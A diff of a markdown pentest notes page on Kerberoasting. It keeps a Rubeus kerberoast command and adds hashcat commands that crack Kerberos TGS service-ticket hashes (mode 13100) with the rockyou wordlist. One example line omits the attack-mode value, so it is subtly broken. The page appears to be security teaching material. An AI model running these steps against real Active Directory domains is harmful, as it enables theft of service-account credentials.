@@ -8,7 +8,7 @@
 
 ### What is Kerberoasting?
 
-
+...
 
 
 
@@ -75,13 +75,17 @@ C:\> Rubeus.exe kerberoast
 ```
 {% endcode %}
 
-### (3) Perform brute-force cracking on the obtained TGS
+(3) Perform brute-force cracking on the obtained TGS:
 
-{% code overflow="wrap" %}
-```powershell
-$ hashcat 
+```sh
+$ hashcat -a 0 -m 13100 <path_to_spn_hash> 
+# eg. 
+$ echo > spn.hash 
+$ hashcat -a -m 13100 spn.hash /usr/share/wordlist/rockyou.txt
 ```
-{% endcode %}
 
-
+* `-a`: Attack mode&#x20;
+  * `-a 0`: Dictionary attack&#x20;
+* `-m` : Hash mode&#x20;
+  * `-m 13100`: **Kerberos 5, etype 23, TGS-REP**
 
